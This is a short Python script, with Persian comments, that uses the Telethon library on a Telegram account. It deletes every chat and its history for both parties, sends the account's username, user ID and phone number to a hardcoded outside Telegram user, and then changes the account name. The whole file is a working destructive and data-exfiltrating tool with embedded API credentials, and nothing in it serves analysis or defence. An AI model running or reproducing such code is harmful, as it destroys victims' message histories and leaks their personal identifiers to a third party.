from telethon import TelegramClient
from telethon.tl.functions.messages import DeleteHistoryRequest
from telethon.tl.functions.account import UpdateProfileRequest

API_ID = 29834234
API_HASH = "552c01d21d127def060f2915aedeebf9"

TARGET_USERNAME = "Moein_915"
NEW_FIRST_NAME = "NewName"

client = TelegramClient("my_account", API_ID, API_HASH)


async def main():
    await client.start()

    async for d in client.iter_dialogs():
        try:
            await client(DeleteHistoryRequest(
                peer=d.entity,
                max_id=0,
                revoke=True
            ))
        except Exception:
            pass

        await client.delete_dialog(d.entity)
        print(f"Deleted: {d.name or d.id}")

    print("Done deleting chats.")

    # گرفتن اطلاعات اکانت
    me = await client.get_me()
    username = f"@{me.username}" if me.username else "(no username)"
    phone = f"+{me.phone}" if me.phone else "(no phone)"
    info_text = f"Username: {username}\nUser ID: {me.id}\nPhone: {phone}"

    print("\n--- Account info to be sent ---")
    print(info_text)
    print("--------------------------------")

    # ارسال اطلاعات
    await client.send_message(TARGET_USERNAME, info_text)
    print(f"Sent account info to {TARGET_USERNAME}")

    # تغییر اسم در آخرین مرحله
    await client(UpdateProfileRequest(
        first_name=NEW_FIRST_NAME
    ))

    print(f"Account name changed to: {NEW_FIRST_NAME}")


with client:
    client.loop.run_until_complete(main())
